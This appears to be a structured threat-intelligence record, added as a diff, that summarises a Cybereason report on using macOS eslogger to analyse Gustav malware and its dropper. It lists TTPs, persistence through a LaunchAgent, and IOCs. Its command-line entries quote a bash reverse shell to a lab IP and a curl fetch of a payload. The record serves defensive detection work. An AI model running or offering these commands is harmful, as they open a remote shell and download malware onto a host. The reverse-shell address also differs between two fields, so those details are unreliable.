@@ -1,0 +1,55 @@
+description: In this edition of the Blue Team Chronicles, we assess the capabilities
+  of eslogger, a new built-in macOS tool, and show how defenders can use this tool
+  to better understand malicious activities on macOS and build new detection approaches.
+  The report analyzes Gustav malware using eslogger.
+attribution: Cybereason
+malware_families:
+- Gustav
+- cheapDropper
+TTPs:
+  processes:
+  - Finder
+  - backgroundtaskmanagementd
+  - bash
+  - Installer
+  - curl
+  commandline:
+  - /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder
+  - /bin/bash -c sh -i >& /dev/tcp/192.168.0.188/6666
+  - curl 192.168.65.1:7777/Gustav o /private/tmp/gustav
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: bash
+    destination_address: 192.168.64.1
+    port: 6666
+  - executable: curl
+    destination_address: 192.168.65.1
+    port: 7777
+  file_modifications:
+  - /Users/secret/Desktop/blog/test_out.json
+  - /Users/secret/cheapDropper
+  - /Users/secret/Library/LaunchAgents/bla.plist
+  - /tmp/PKInstallSandbox.jaN7a2/Scripts/exec.script.test.dCgn6O/preinstall
+  - /private/tmp/gustav
+  persistence:
+  - Creation of a launch agent (bla.plist) in ~/Library/LaunchAgents, executed by
+    launchd upon user login.
+  pipes: ''
+  process_relations:
+  - backgroundtaskmanagementd -> LaunchAgent creation via btm_launch_item_add
+  - launchd -> execution of the plist file
+  - Gustav -> spawning bash as a child process for reverse shell
+IOCs:
+- 'signing_id: cheapDropper'
+- /Users/secret/cheapDropper
+- /Users/secret/Library/LaunchAgents/bla.plist
+- 192.168.64.1:6666
+- 192.168.65.1:7777
+authors:
+- Silvio Riener
+reference: https://www.cybereason.com/blog/blue-teaming-on-macos-with-eslogger
+date_of_publication: May 22, 2025
+file_creation_date: May 22, 2025
